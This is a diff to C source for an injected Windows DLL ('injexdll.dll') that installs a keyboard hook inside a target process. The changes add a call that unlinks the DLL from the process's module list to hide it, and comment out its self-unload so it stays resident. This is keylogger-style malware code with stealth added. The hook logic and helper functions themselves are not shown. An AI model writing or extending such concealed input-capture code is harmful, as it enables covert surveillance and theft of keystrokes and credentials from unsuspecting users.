@@ -25,9 +25,11 @@ LRESULT CALLBACK KeyboardHook(int nCode,WPARAM wParam,LPARAM lParam)
 	return 0;
 }
 
-DWORD WINAPI start(LPVOID lpParameter){
+DWORD WINAPI start(HMODULE hModule){
 	odprintf("Laying hooks inside %d.", GetCurrentProcessId());
 	// START YOU CODE HERE...
+	
+	UnlinkModuleByName(hModule);
 
 	HookKeyboard(KeyboardHook);
 
@@ -37,7 +39,7 @@ DWORD WINAPI start(LPVOID lpParameter){
 	
 	UnhookKeyboard();
 	
-	UnloadSelfAndExit((HMODULE)lpParameter);
+	//UnloadSelfAndExit(hModule);
 	
 	// STOP HERE.
 	odprintf("%d:%d exiting...", GetCurrentProcessId(), GetCurrentThreadId());
@@ -47,7 +49,7 @@ DWORD WINAPI start(LPVOID lpParameter){
 void createNewThread(HMODULE hModule){
 	HANDLE t;
 	DWORD tid;
-	t = CreateThread(NULL, 0, start, (LPVOID)hModule, 0, &tid);
+	t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start, (LPVOID)hModule, 0, &tid);
 	odprintf("Created thread %d inside of process %d.", tid, GetCurrentProcessId());
 	CloseHandle(t);
 }
@@ -68,6 +70,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		break;
 
 	case DLL_THREAD_DETACH:
+		odprintf("Unloading injexdll.dll!");
 		break;
 
 	case DLL_PROCESS_DETACH:
